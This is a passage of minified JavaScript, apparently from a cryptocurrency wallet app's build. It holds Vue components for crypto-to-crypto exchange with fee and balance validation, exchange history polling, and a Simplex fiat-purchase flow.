              ? this.$wallets.getWallet("1e3474f2b340129d83af2b946434a90e")
              : ["ARB"].includes(this.coinToSend.deprecatedParent)
              ? this.$wallets.getWallet(this.coinToSend.deprecatedParent)
              : this.$wallets.getWallet(
                  this.coinToSend.getFeeTicker
                    ? this.coinToSend.getFeeTicker()
                    : null === (t = this.coinToSend) || void 0 === t
                    ? void 0
                    : t.deprecatedParent
                );
          },
          cashbackParams() {
            return { amount: this.amountToSend, wallet: this.coinToSend };
          },
          isHBARActivate() {
            return (
              ("HBAR" === this.coinToSend.id && !this.coinToSend.address) ||
              ("HBAR" === this.coinToReceive.id && !this.coinToReceive.address)
            );
          },
        },
        watch: {
          async coinToSend(e, t) {
            await this.watchForCoins(this.coinToReceive, e, t);
          },
          async coinToReceive(e, t) {
            await this.watchForCoins(this.coinToSend, e, t),
              e !== t &&
                this.valid.status &&
                (clearTimeout(this.fetcher),
                (this.fetcher = setTimeout(() => {
                  this.fetchRate();
                }, g)));
          },
        },
        created() {
          this.initializeSetSelectedCoins();
        },
        async beforeMount() {
          try {
            const e = await this.$exchanges.getAvailableWalletIdCollection(
              this.currenciesExchange,
              this.$wallets
            );
            this.filteredCurrenciesExchange = e.filter(
              (e) => !m.DISABLED_COINS.includes(e)
            );
          } catch (e) {
            console.error(e);
          }
        },
        beforeDestroy() {
          clearTimeout(this.fetcher), clearInterval(this.pairRateInterval);
        },
        async mounted() {
          localStorage.getItem(P) &&
            ((this.isCheckbox = !1), (this.checkboxValue = !0)),
            await this.setMinimalAmount(),
            await this.getAvailableBalance();
        },
        methods: {
          initializeSetSelectedCoins() {
            var e, t;
            const i = this.$route.query.coinToReceive,
              a = this.$route.query.coinToSend;
            let s =
                null !==
                  (e = localStorage.getItem("exchange::coin-to-receive-id")) &&
                void 0 !== e
                  ? e
                  : v,
              n =
                null !==
                  (t = localStorage.getItem("exchange::coin-to-send-id")) &&
                void 0 !== t
                  ? t
                  : f;
            i && a
              ? ((s = i), (n = a))
              : i
              ? ((s = i), (n = f))
              : a && ((s = v), (n = a)),
              (this.selectedCoinToReceiveId = s),
              (this.selectedCoinToSendId = n);
          },
          async buyCoin() {
            const e = this.isMinMaxError
              ? this.coinToSend.id
              : this.coinToSend.feeTicker;
            this.$buy.isAvailable({ id: e })
              ? this.$router.push(
                  "/simplex/USD/" + this.$buy.getAvailableWallet({ id: e }).id
                )
              : ((this.selectedCoinToReceiveId = e),
                (this.selectedCoinToSendId = "BTC"),
                await this.getAvailableBalance());
          },
          isCoinDisabled(e) {
            return (
              (null === e || void 0 === e ? void 0 : e.ticker) &&
              !n.CoinRestrictionPolicy.isAllowed(e.ticker, n.ACTION_EXCHANGE)
            );
          },
          tryAgain() {
            this.isError = !1;
          },
          async watchForCoins(e, t) {
            (this.exchangeRate = null),
              e !== t &&
                (this.clearValidation(), await this.setMinimalAmount());
          },
          clearValidation() {
            (this.amountToSendError = ""),
              (this.valid = { message: "", status: !0 });
          },
          async setMinimalAmount() {
            this.inactivePairError = "";
            try {
              const e = await this.getMinimalAmount(
                this.coinToSend,
                this.coinToReceive
              );
              this.minimalAmount = e ? e.min : 0;
            } catch (t) {
              var e;
              (this.inactivePairError =
                "not_valid_ticker_pair" ===
                (null === t ||
                void 0 === t ||
                null === (e = t.data) ||
                void 0 === e
                  ? void 0
                  : e.error)
                  ? T
                  : "Pair is temporarily unavailable"),
                (this.valid = { message: this.inactivePairError, status: !1 });
            }
          },
          talkWithSupport() {
            const e = ["TFUEL", "VTHO"].includes(this.feeWallet.ticker)
                ? this.coinToSend.address
                : this.feeWallet.address,
              t = {
                additionalText: `-----------------------\nFee: ${this.feeToClaim} ${this.feeWallet.ticker}\nMy ${this.feeWallet.ticker} address: ${e}`,
                subject: "Other issues",
                topic: `Claim ${this.feeWallet.ticker} for ${this.coinToSend.ticker}>${this.coinToReceive.ticker} exchange`,
                isNotText: !1,
                tags: ["claim"],
              };
            "TFUEL" === this.feeWallet.ticker &&
              ((t.additionalText =
                "Dear support, I don't have enough TFUEL to complete exchange. Could you help me, please?\n" +
                t.additionalText),
              (t.isNotText = !0)),
              this.$bus.$emit("openSupportPopup", t);
          },
          async validateExchange() {
            (this.feeToClaim = null),
              (this.isBuyCoin = !1),
              (this.isMinMaxError = !1);
            for (const i of [
              this.selectedCoinToReceiveId,
              this.selectedCoinToSendId,
            ])
              if (
                !n.CoinRestrictionPolicy.isAllowed(
                  i.toUpperCase(),
                  n.ACTION_EXCHANGE
                )
              )
                return void (this.valid = {
                  message: n.CoinRestrictionPolicy.getMessage(
                    i.toUpperCase(),
                    n.ACTION_EXCHANGE
                  ),
                  status: !1,
                });
            if (this.inactivePairError)
              return void (this.valid = {
                message: this.inactivePairError,
                status: !1,
              });
            if (this.coinToSend.id === this.coinToReceive.id)
              return void (this.valid = { message: T, status: !1 });
            const e = this.getMaxMinErrorText();
            if (e) return void (this.valid = { message: e, status: !1 });
            const t = await this.isAvailableForSend();
            t
              ? (this.valid = { message: t, status: !1 })
              : Number(this.amountToSend) > 0 &&
                "XRP" === this.coinToReceive.ticker &&
                Number(this.amountToReceive) < w &&
                Number(this.amountToReceive) > 0 &&
                !isNaN(Number(this.amountToReceive))
              ? (this.valid = { message: x, status: !1 })
              : this.amountToSendError
              ? (this.valid = { message: this.amountToSendError, status: !1 })
              : (this.valid = { message: "", status: !0 });
          },
          getMaxMinErrorText() {
            const e = this.$rates.convertToUSD(
                this.amountToSend,
                this.coinToSend,
                "BTC"
              ),
              t = this.$rates.getCoinPrice(this.coinToSend, "BTC"),
              i = Number((k / t).toFixed(y));
            var a;
            if (i && e && Number(e) >= k)
              return `The maximum amount for exchange is ${i} ${
                null === (a = this.coinToSend) || void 0 === a
                  ? void 0
                  : a.ticker
              }.\nWe recommend you to split the exchange into several transactions`;
            if (Number(this.amountToSend) >= Number(this.minimalAmount))
              return !1;
            Number(this.availableBalance) < Number(this.minimalAmount) &&
              ((this.isBuyCoin = !S.includes(this.coinToSend.deprecatedParent)),
              (this.isMinMaxError = !0));
            const s = this.coinToSend.ticker;
            return `The minimum amount for exchange is ${this.$options.filters.formatFinance(
              this.minimalAmount
            )} ${s}`;
          },
          getIsBuyCoin() {
            const e = this.$rates.convertToUSD(
                this.amountToSend,
                this.coinToSend,
                "BTC"
              ),
              t = this.$rates.getCoinPrice(this.coinToSend, "BTC"),
              i = Number((k / t).toFixed(y));
            (i && e && Number(e) >= k) ||
              (Number(this.amountToSend) >= Number(this.minimalAmount) &&
                (this.isBuyCoin = !S.includes(
                  this.coinToSend.deprecatedParent
                )),
              Number(this.amountToSend) > Number(this.availableBalance || 0) &&
                (this.isBuyCoin = !S.includes(
                  this.coinToSend.deprecatedParent
                )));
          },
          async isAvailableForSend() {
            let e = !0,
              t = !0;
            const i = this.coinToSend.toMinimalUnit(this.amountToSend),
              a = this.coinToSend.toMinimalUnit(this.availableBalance),
              { BN: s } = this.$wallets.getWallet(
                this.coinToSend.deprecatedParent
              );
            if (((t = this.amountToSend >= 0 && new s(i).lte(new s(a))), !t))
              return (
                this.getIsBuyCoin(),
                (this.isBuyCoin = !S.includes(
                  this.coinToSend.deprecatedParent
                )),
                (this.isMinMaxError = !0),
                `To make this exchange, deposit more ${this.coinToSend.ticker} to your wallet`
              );
            if (
              (this.coinToSend instanceof n.Token
                ? (e = await this.coinToSend.isAvailableForFee(
                    new this.feeWallet.BN(this.feeParams.fee),
                    this.feeWallet.indivisibleBalance
                  ))
                : "VET" === this.coinToSend.ticker &&
                  (e = await this.feeWallet.isAvailableForFee(
                    new this.feeWallet.BN(this.feeParams.fee),
                    this.feeWallet.indivisibleBalance
                  )),
              ["ONT", "THETA"].includes(this.coinToSend.ticker) &&
                (e = this.feeWallet.indivisibleBalance.gte(this.feeParams.fee)),
              !e)
            ) {
              this.isBuyCoin = !1;
              const e = this.feeWallet.toCurrencyUnit(this.feeParams.fee);
              return (
                ["TRX", "BSC", "BTT", "VTHO", "ONG", "TFUEL", "ETH"].includes(
                  this.feeWallet.ticker
                ) && (this.feeToClaim = e),
                "THETA" === this.coinToSend.ticker
                  ? `You don’t have enough ${this.feeWallet.ticker} to exchange ${this.coinToSend.ticker}`
                  : `You should have ${e} ${this.feeWallet.ticker} to exchange ${this.coinToSend.ticker}`
              );
            }
            const o = () => {
              const e = new this.coinToSend.BN(
                  this.coinToSend.toMinimalUnit(this.amountToSend)
                ),
                t = new this.coinToSend.BN(
                  this.coinToSend.toMinimalUnit(this.availableBalance)
                ),
                i = this.coinToSend.indivisibleBalance;
              return e.gt(t) && e.lte(i);
            };
            return (
              !!o() &&
              `You should leave minimum\n          ${this.coinToSend.toCurrencyUnit(
                this.coinToSend.unspendableBalance
              )}\n          ${
                this.coinToSend.ticker
              } on your account,\n          this amount is locked by ${
                this.coinToSend.name
              }.`
            );
          },
          async getAvailableBalance(e) {
            var t, i;
            void 0 === e && (e = !0);
            const a = this.coinToSend instanceof n.Token,
              s = this.$wallets.getWallet(this.coinToSend.deprecatedParent);
            let o = null;
            if (
              (a
                ? await s.getInfo({
                    isToken: !0,
                    contract: this.coinToSend.contract,
                    ticker: this.coinToSend.ticker,
                  })
                : await s.getInfo({ onlyCoin: !0 }),
              null !== (t = this.feeWallet) &&
                void 0 !== t &&
                null !== (i = t.isFeeDynamic) &&
                void 0 !== i &&
                i.call(t))
            ) {
              const e = a
                  ? await this.feeWallet.estimateGas(
                      "1",
                      "",
                      this.coinToSend.contract,
                      this.coinToSend.denom
                    )
                  : this.coinToSend.gasLimit,
                t = await this.feeWallet.getGasPrice(!1, a);
              (o = await this.feeWallet.getFee({
                userGasPrice: String(t),
                gasLimit: e,
              })),
                (this.feeParams.gasLimit = e),
                (this.feeParams.gasPrice = t),
                (this.feeParams.fee = o);
            } else {
              const e =
                "ADA" === this.feeWallet.ticker
                  ? this.feeWallet.privateKey.byronAddress
                  : void 0;
              (o = await this.feeWallet.getFee({ address: e })),
                (this.feeParams.fee = o);
            }
            var r, c;
            "TRX" === this.feeWallet.ticker &&
              "TRX" !== this.coinToSend.ticker &&
              (this.feeParams.fee = this.feeWallet.toMinimalUnit(
                null === (r = this.feeWallet) ||
                  void 0 === r ||
                  null === (c = r.feeData) ||
                  void 0 === c
                  ? void 0
                  : c.feeTRC20
              ));
            (this.availableBalance =
              "THETA" === this.coinToSend.id
                ? await this.coinToSend.availableBalance("0")
                : await this.coinToSend.availableBalance(o)),
              e &&
                ((this.availableBalance =
                  await this.coinToSend.availableBalance(
                    this.coinToSend.id === this.feeWallet.id &&
                      "THETA" !== this.coinToSend.id
                      ? o
                      : "0"
                  )),
                await this.setAmountToSend(this.availableBalance));
          },
          calcuteRate() {
            if (0 === Number(this.amountToSend)) return;
            const e = this.amountToReceive / this.amountToSend;
            this.exchangeRate = Number(e > _ ? e.toFixed(y) : e.toFixed(C));
          },
          async setAmountToSend(e) {
            (this.amountToReceive = "..."),
              (this.amountToSend = e),
              0 === Number(e) && (this.amountToReceive = "0"),
              (this.fetcher = setTimeout(() => {
                this.fetchRate();
              }, g));
          },
          async changeCoins() {
            if (this.loading) return;
            this.exchangeRate = null;
            const e = this.coinToReceive,
              t = this.coinToSend;
            await Promise.allSettled([
              this.selectCoin(t, !1, !1),
              this.selectCoin(e, !0, !1),
            ]),
              await this.getAvailableBalance(!0);
          },
          getPairRate() {
            const e = this.getRate(
              this.coinToSend,
              this.coinToReceive,
              this.amountToSend
            );
            e &&
              e
                .then(async (e) => {
                  (this.amountToReceive = String(e)),
                    this.calcuteRate(),
                    await this.validateExchange();
                })
                .catch((e) => {
                  console.log(e);
                });
          },
          fetchRate() {
            clearTimeout(this.fetcher),
              clearInterval(this.pairRateInterval),
              (this.amountToReceive =
                Number(this.amountToSend) > 0 ? "..." : "0"),
              (this.exchangeRate = null),
              this.getPairRate(),
              (this.pairRateInterval = setInterval(() => {
                this.getPairRate();
              }, b));
          },
          async selectCoin(e, t, i) {
            void 0 === t && (t = !1),
              void 0 === i && (i = !0),
              t
                ? ((this.selectedCoinToSendId = e.id),
                  localStorage.setItem("exchange::coin-to-send-id", e.id))
                : ((this.selectedCoinToReceiveId = e.id),
                  localStorage.setItem("exchange::coin-to-receive-id", e.id)),
              i && (await this.getAvailableBalance(t));
          },
          async exchangeCoins() {
            this.loading = !0;
            let e = "",
              t = !1;
            this.$ga.event("User Actions", "Exchange coins", {
              clientID: this.$ga.customParams.uid,
            }),
              await this.$wallets.activateWallet(this.coinToReceive),
              localStorage.setItem(P, "1"),
              (this.isCheckbox = !1),
              (this.checkboxValue = !0);
            const i = this.$wallets.getWallet(
                "e1326549e8ba36b606d8cec00d930139"
              ),
              a = this.$wallets.getWallet("BNB", "atomic"),
              s = this.$wallets.getWallet("ETH", "atomic"),
              n =
                this.estimatedCashback > 0 && this.isMember
                  ? this.estimatedCashback
                  : 0,
              o = {
                hash: this.$wallets.hash,
                ethAddr: s.address,
                bnbAddr: a.address,
                estimatedAwcCashback: String(n),
                estimatedAwcCashbackRate: String(
                  this.$rates.convertToUSD(n, i, "USD")
                ),
                awcBep2Balance: String(this.awcBalance),
                awcBep2Rate: String(
                  this.$store.getters.coinRate("USD", i).rate
                ),
              },
              r =
                "BSV" === this.coinToReceive.ticker
                  ? this.coinToReceive.convertToLegacyAddress(
                      this.$getAddressWallet(
                        this.coinToReceive.deprecatedParent
                      )
                    )
                  : this.$getAddressWallet(this.coinToReceive.deprecatedParent),
              c =
                "BSV" === this.coinToSend.ticker
                  ? this.coinToSend.convertToLegacyAddress(
                      this.$getAddressWallet(this.coinToSend.deprecatedParent)
                    )
                  : this.$getAddressWallet(this.coinToSend.deprecatedParent);
            this.createExchangeTransaction(
              this.coinToSend,
              this.coinToReceive,
              r,
              c,
              this.amountToSend,
              this.amountToReceive,
              void 0,
              o
            )
              .then(async (i) => {
                this.$ga.event("Exchange", "Create Exchange Tx Succeed", {
                  clientID: this.$ga.customParams.uid,
                });
                try {
                  const e = this.validateExchangeTx(i);
                  t = e.payinAddress;
                  const a = this.coinToSend.toMinimalUnit(e.amountToSend);
                  (this.exchangeResult = await this.sendTransaction(
                    this.coinToSend,
                    e.payinAddress,
                    a,
                    e.payinExtraId,
                    e.id,
                    this.feeParams
                  )),
                    (this.sentHash = this.exchangeResult.txid),
                    (this.orderId = e.orderId),
                    (this.loading = !1);
                  const s = {
                    id: this.orderId,
                    amountToSend: this.amountToSend,
                    amountToReceive: this.amountToReceive,
                    to: i.to,
                    toCurrency: this.coinToReceive.ticker,
                    from: i.from,
                    fromCurrency: this.coinToSend.ticker,
                    expectedCashbackAmount: this.estimatedCashback,
                    status: "",
                    payinHash: this.sentHash,
                    payoutHash: "",
                  };
                  this.$emit("openExchangeDetails", s),
                    this.$emit("startExchange", s),
                    await this.getAvailableBalance(),
                    this.$ga.event("Exchange", "Exchange Succeed", {
                      clientID: this.$ga.customParams.uid,
                    });
                } catch (a) {
                  throw (
                    (this.$ga.event("Exchange", "Exchange Failed", {
                      clientID: this.$ga.customParams.uid,
                    }),
                    (e = "sendExchangeTransaction"),
                    (this.loading = !1),
                    (this.valid = {
                      message: "Transaction failed, try again later.",
                      status: !1,
                    }),
                    a)
                  );
                }
              })
              .catch((i) => {
                (this.isError = !0),
                  this.$ga.event("Exchange", "Create Exchange Tx Failed", {
                    clientID: this.$ga.customParams.uid,
                  }),
                  console.log(i),
                  e || (e = "createExchangeTransaction"),
                  (this.loading = !1),
                  (this.valid = {
                    message:
                      "Exchange service currently unavailable, try again later.",
                    status: !1,
                  }),
                  (i.message = JSON.stringify({
                    currentError: i.toString(),
                    exchangeErrorType: e,
                    provider: this.defaultService,
                    fromCurrency: this.coinToSend.ticker,
                    toCurrency: this.coinToReceive.ticker,
                    fromAddress: this.$getAddressWallet(
                      this.coinToSend.deprecatedParent
                    ),
                    toAddress: this.$getAddressWallet(
                      this.coinToReceive.deprecatedParent
                    ),
                    viaAddress: t || "",
                    inputHash: this.exchangeResult
                      ? this.exchangeResult.txid
                      : "",
                    amountTo: this.amountToSend,
                  })),
                  this.$wallets.logger.error({
                    type: "Exchange",
                    error: i,
                    currency: this.coinToSend.ticker,
                    instance: this,
                  });
              });
          },
        },
      };
      t.default = E;
    },
    834: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = i(15),
        o = a(i(319)),
        r = a(i(2304));
      const c = 3e4,
        l = 6,
        d = 50,
        u = 2;
      var h = {
        name: "ExchangeHistory",
        components: { ExchangeHistoryItem: r.default, Table: o.default },
        filters: {
          fixedAmount: function (e) {
            return Number(Number(e).toFixed(l)).toString();
          },
        },
        mixins: [n.ExchangeMixin, n.ScrollMixin],
        data: () => ({
          page: 0,
          isLoader: !1,
          header: [{ title: "You sent" }, { title: "You got" }],
          activeTx: null,
        }),
        computed: {
          ...(0, s.mapGetters)([
            "exchangeTransactions",
            "exchangeTransactionsLoading",
          ]),
          transactions() {
            return this.exchangeTransactions.slice(
              0,
              Math.max(d, d * this.page)
            );
          },
          isListEnded() {
            return this.exchangeTransactions.length <= d * this.page;
          },
        },
        async mounted() {
          this.$ga.event("User Movement", "exchange-history-page", {
            clientID: this.$ga.customParams.uid,
          }),
            this.initExchangeTransactions(),
            (this.isLoader = 0 === this.exchangeTransactions.length),
            this.fetchExchangeTransactions(),
            (this.isLoader = !1);
        },
        beforeDestroy() {
          clearTimeout(this.fetchExchangeTransactionsTimeout);
        },
        methods: {
          ...(0, s.mapActions)([
            "getExchangeTransactions",
            "initExchangeTransactions",
          ]),
          async fetchExchangeTransactions() {
            clearTimeout(this.fetchExchangeTransactionsTimeout);
            const e = { limit: d, offset: this.page * d };
            this.checkExchangeTransactionsUpdates(),
              await this.getExchangeTransactions({
                atomicId: this.$wallets.hash,
                params: e,
              }),
              (this.fetchExchangeTransactionsTimeout = setTimeout(
                () => this.fetchExchangeTransactions(),
                c
              ));
          },
          checkExchangeTransactionsUpdates() {
            if (!this.exchangeTransactions.length) return;
            const e = [],
              t = new Date();
            this.exchangeTransactions.forEach((i) => {
              let { id: a, status: s, timestamp: n } = i;
              const o = !["Expired", "Completed", "Refunded"].includes(s),
                r = new Date(n);
              r.setDate(r.getDate() + u),
                o && r > t && e.push(this.getStatus(a));
            }),
              this.$emit("updatingStatus", e);
          },
        },
      };
      t.default = h;
    },
    836: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = i(15),
        o = a(i(5538)),
        r = a(i(2305)),
        c = {
          name: "Simplex",
          components: { NewSimplexResult: o.default },
          mixins: [n.ExchangeMixin],
          data: () => ({
            isOpenOrderDetails: !1,
            activeSimplexTransactionId: null,
            tabs: [
              { title: "Buy crypto", path: "/simplex" },
              { title: "Order History", path: "/simplex/history" },
            ],
          }),
          computed: {
            ...(0, s.mapGetters)(["activeTab", "simplexTransactions"]),
            activeSimplexTransaction() {
              return this.simplexTransactions.find(
                (e) => e.id === this.activeSimplexTransactionId
              );
            },
          },
          methods: {
            ...(0, s.mapActions)(["changeTab"]),
            checkSimplexStatus: r.default,
            toggleOrderDetails(e) {
              (this.activeSimplexTransactionId =
                null === e || void 0 === e ? void 0 : e.id),
                this.$nextTick(() => {
                  this.isOpenOrderDetails = !!e;
                });
            },
            isActive(e) {
              return (
                ("simplex-with-tickers" === this.$route.name ||
                  "simplex-with-tickers-value" === this.$route.name) &&
                "/simplex" === e
              );
            },
          },
        };
      t.default = c;
    },
    838: function (e, t, i) {
      "use strict";
      (function (e) {
        var a = i(0);
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.default = void 0);
        var s = i(30),
          n = i(27),
          o = i(2410),
          r = i(17),
          c = i(15),
          l = a(i(84)),
          d = a(i(2300)),
          u = a(i(2301)),
          h = a(i(2302)),
          p = a(i(5540)),
          m = a(i(674)),
          f = a(i(2303));
        const v = 200,
          g = "USD",
          b = "btc",
          w = 500,
          x = [
            "quoteId",
            "paymentId",
            "orderId",
            "userId",
            "cookieUaid",
            "coockieSession",
            "totalFiatAmount",
            "requestedCoinAmount",
          ],
          T = "accept::terms::simplex";
        var y = {
          name: "SimplexExchange",
          components: {
            EditAmount: l.default,
            ChangeIcon: d.default,
            ExchangeCoin: u.default,
            CashbackInfo: h.default,
            FiatDropdownV2: p.default,
            AtomicCheckbox: m.default,
            CashbackPromotion: f.default,
          },
          mixins: [c.CashbackMixin],
          data: () => ({
            preload: "file:" + i(222).resolve(e, "./userAgent.html"),
            selectedCoinToReceive: b,
            selectedCoinToReceiveId: b,
            selectedFiatToSend: g,
            requestedFiatAmount: "" + v,
            totalFiatAmount: "",
            requestedCoinAmount: "...",
            amountError: "",
            userId: void 0,
            quoteId: void 0,
            paymentId: void 0,
            orderId: void 0,
            cookieUaid: void 0,
            cookieSession: void 0,
            currentGeo: "",
            currentIP: "",
            currentUserAgent: null,
            callTimer: null,
            quoteError: !1,
            isFiatDropdown: !1,
            isFiatLoading: !1,
            loadingSimplexForm: !1,
            requestToken: null,
            exchangeSettings: null,
            checkboxValue: !1,
            isCheckbox: !0,
          }),
          computed: {
            ...(0, r.mapGetters)(["coinRate"]),
            availableCurrencies() {
              try {
                return this.simplex.getAvailableWallets();
              } catch {
                return [];
              }
            },
            cashbackParams() {
              return {
                amount: this.requestedCoinAmount,
                wallet: this.coinToReceive,
              };
            },
            isButtonAccepted() {
              return (
                Number(this.requestedCoinAmount) &&
                Number(this.requestedFiatAmount) &&
                !this.isFiatLoading &&
                !this.loadingSimplexForm
              );
            },
            userAgent() {
              return this.currentUserAgent;
            },
            coinToReceive() {
              return this.$wallets.getWallet(
                this.selectedCoinToReceiveId,
                "atomic"
              );
            },
            coinAddress() {
              const { address: e } = this.$wallets.getWallet(
                this.coinToReceive.deprecatedParent,
                "atomic"
              );
              return e;
            },
            hasFiatRate() {
              return Object.keys(this.$buy.settings.fiats).includes(
                this.fiatRate
              );
            },
            simplexTransaction() {
              const e =
                  this.estimatedCashback > 0 && this.isMember
                    ? this.estimatedCashback
                    : 0,
                t = {
                  buyParams: {
                    paymentId: this.paymentId,
                    quoteId: this.quoteId,
                    atomicId: this.$wallets.hash,
                    status: "Attempt",
                    fromCurrency: this.selectedFiatToSend,
                    toCurrency: this.coinToReceive.ticker,
                    amountSend: this.requestedFiatAmount,
                    amountReceive: this.requestedCoinAmount,
                    payoutAddress: this.coinAddress,
                  },
                  cashbackParams: {
                    atomicId: this.$wallets.hash,
                    bnbAddress: this.$wallets.getWallet("BNB").address,
                    ethAddress: this.$wallets.getWallet("ETH").address,
                    expectedCashbackAmount: e,
                    expectedCashbackAmountRate: String(
                      this.$rates.convertToUSD(e, "AWC", "USD")
                    ),
                    awcBep2Balance: this.awcBalance,
                    awcBep2Rate: String(
                      this.coinRate(
                        "USD",
                        this.$wallets.getWallet(
                          "e1326549e8ba36b606d8cec00d930139"
                        )
                      ).rate
                    ),
                    exchangeService: "Simplex",
                    platform: `${this.appConfig.platform} ${this.appConfig.version}`,
                    walletVersion: this.appConfig.version,
                  },
                };
              return t;
            },
            isCoinDisabled() {
              var e;
              return !s.CoinRestrictionPolicy.isAllowed(
                null === (e = this.selectedCoinToReceive) || void 0 === e
                  ? void 0
                  : e.toUpperCase(),
                s.ACTION_BUY
              );
            },
          },
          watch: {
            async selectedFiatToSend(e, t) {
              e !== t &&
                (await this.updateExchangeSettings(),
                await this.getCoinPrice());
            },
            fiatRate(e) {
              this.selectedFiatToSend = this.hasFiatRate ? e : g;
            },
            userId(e) {
              this.setUserID(e);
            },
            requestedFiatAmount(e, t) {
              e !== t && this.validationAmount();
            },
          },
          async beforeMount() {
            const { simplexApiUrl: e } = this.$buy.settings;
            (this.simplex = new o.Simplex(e)),
              await this.updateExchangeSettings();
          },
          async mounted() {
            localStorage.getItem(T) &&
              ((this.isCheckbox = !1), (this.checkboxValue = !0));
            const e = localStorage.getItem("simplex::receiveCoinId");
            if (
              (this.$route.params.value &&
                (this.requestedFiatAmount = Math.max(
                  this.$route.params.value,
                  v
                ).toString()),
              this.$route.params.walletToReceive)
            ) {
              const e = this.$wallets.getWallet(
                this.$route.params.walletToReceive
              );
              (this.selectedCoinToReceiveId = e.id),
                (this.selectedCoinToReceive = e.ticker);
            } else
              e && "undefined" !== e
                ? ((this.selectedCoinToReceive = localStorage.getItem(
                    "simplex::receiveCoin"
                  )),
                  (this.selectedCoinToReceiveId = e))
                : ((this.selectedCoinToReceive = b),
                  (this.selectedCoinToReceiveId = b));
            (this.selectedFiatToSend =
              (this.hasFiatRate && this.fiatRate) || g),
              this.$refs.userAgent.addEventListener("dom-ready", () => {
                this.currentUserAgent = this.$refs.userAgent.getUserAgent();
              }),
              this.changeTab(0),
              await this.getGeo();
          },
          methods: {
            ...(0, r.mapActions)([
              "changeTab",
              "setUserID",
              "setSimplexSession",
              "setSimplexNewTransaction",
            ]),
            getCoinDisabilityReason() {
              var e;
              return s.CoinRestrictionPolicy.getMessage(
                null === (e = this.selectedCoinToReceive) || void 0 === e
                  ? void 0
                  : e.toUpperCase(),
                s.ACTION_BUY
              );
            },
            async updateExchangeSettings() {
              (this.exchangeSettings = await this.$buy.getSettings(
                this.selectedFiatToSend
              )),
                (this.requestedFiatAmount = String(
                  +(this.exchangeSettings.default || this.exchangeSettings.min)
                ));
            },
            outsideClick() {
              this.isFiatDropdown = !1;
            },
            onInput() {
              this.clearExchangeInfo(),
                (this.requestedCoinAmount = "..."),
                (this.isFiatLoading = !0),
                clearTimeout(this.callTimer),
                (this.callTimer = setTimeout(() => {
                  this.getCoinPrice();
                }, w));
            },
            selectForReceive(e) {
              (this.isFiatLoading = !0),
                (this.selectedCoinToReceive = e.ticker),
                (this.selectedCoinToReceiveId = e.id),
                localStorage.setItem("simplex::receiveCoin", e.ticker),
                localStorage.setItem("simplex::receiveCoinId", e.id),
                this.getCoinPrice();
            },
            toggleFiatDropdown(e) {
              e.stopPropagation(), (this.isFiatDropdown = !this.isFiatDropdown);
            },
            selectFiat(e) {
              (this.isFiatLoading = !0),
                (this.selectedFiatToSend = e.code),
                (this.isFiatDropdown = !1);
            },
            validationAmount() {
              this.amountError = "";
              const e = Object.values(this.$buy.settings.fiats).find(
                (e) => e.code === this.selectedFiatToSend
              );
              +this.requestedFiatAmount < +e.min
                ? (this.amountError = `Minimum order amount is ${e.char}${e.min}`)
                : +this.requestedFiatAmount > +e.max &&
                  (this.amountError = `Maximum amount is ${e.char}${e.max}`);
            },
            setExchangeInfo(e) {
              e.token === this.requestToken &&
                x.forEach((t) => {
                  this[t] = e[t];
                });
            },
            clearExchangeInfo() {
              x.forEach((e) => {
                this[e] = void 0;
              });
            },
            async getCoinPrice() {
              if (
                ((this.requestedCoinAmount = "..."), "" === this.amountError)
              ) {
                (this.isFiatLoading = !0),
                  (this.quoteError = !1),
                  (this.requestToken = Math.random()
                    .toString(36)
                    .substring(2, 15));
                try {
                  const e = await this.simplex.getExchangeRate(
                    this.selectedFiatToSend,
                    this.coinToReceive,
                    this.requestedFiatAmount,
                    this.$wallets.hash,
                    this.requestToken
                  );
                  this.setExchangeInfo(e);
                } catch (e) {
                  console.log(e), (this.quoteError = !0);
                }
                this.isFiatLoading = !1;
              }
            },
            async submitSimplexForm() {
              if (
                ((this.loadingSimplexForm = !0),
                this.$ga.event("User Actions", "Create Simplex Exchange Tx", {
                  clientID: this.$ga.customParams.uid,
                }),
                "" !== this.amountError)
              )
                return;
              localStorage.setItem(T, "1"),
                (this.isCheckbox = !1),
                (this.checkboxValue = !0),
                await this.$wallets.activateWallet(this.coinToReceive);
              const { paymentRequestPayload: e, submitRequestPayload: t } =
                await this.simplex.createExchangeTransaction({
                  userId: this.userId,
                  quoteId: this.quoteId,
                  paymentId: this.paymentId,
                  orderId: this.orderId,
                  cookieSession: this.cookieSession,
                  cookieUaid: this.cookieUaid,
                  fiatTicker: this.selectedFiatToSend,
                  fiatAmount: this.requestedFiatAmount,
                  coinAmount: this.requestedCoinAmount,
                  coinAddress: this.coinAddress,
                  coin: this.coinToReceive,
                  ip: this.currentIP,
                  geo: this.currentGeo,
                });
              try {
                const i = await this.simplex.makeExchange({
                  paymentRequestPayload: e,
                  submitRequestPayload: t,
                });
                this.setSimplexSession(i),
                  this.setSimplexNewTransaction(this.simplexTransaction),
                  this.$ga.event("User Actions", "Exchange fiat", {
                    clientID: this.$ga.customParams.uid,
                  }),
                  this.$router.push("/simplex/webview"),
                  this.clearExchangeInfo(),
                  (this.loadingSimplexForm = !1);
              } catch (i) {
                throw i;
              }
            },
            async getGeo() {
              const { ip: e, geo: t } = await (0, n.getGeo)();
              (this.currentIP = e),
                (this.currentGeo = t),
                await this.getCoinPrice();
            },
          },
        };
        t.default = y;
      }).call(this, "/");
    },
    840: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = a(i(319)),
        o = a(i(2304)),
        r = a(i(2305)),
        c = i(15),
        l = {
          name: "SimplexHistory",
          components: { ExchangeHistoryItem: o.default, Table: n.default },
          mixins: [c.ExchangeMixin],
          data: () => ({
            updateSimplexTransactionsFromDBID: null,
            header: [{ title: "You sent" }, { title: "You got" }],
          }),
          computed: {
            ...(0, s.mapGetters)([
              "simplexTransactions",
              "isSimplexTransactionsLoading",
            ]),
          },
          async mounted() {
            await this.updateSimplexTransactionsFromDB();
          },
          methods: {
            ...(0, s.mapActions)(["updateSimplexTransactionsFromDB"]),
            checkStatus(e) {
              return (0, r.default)(e);
            },
          },
        };
      t.default = l;
    },
    841: function (e, t, i) {
      "use strict";
      (function (e) {
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.default = void 0);
        var a = i(17),
          s = {
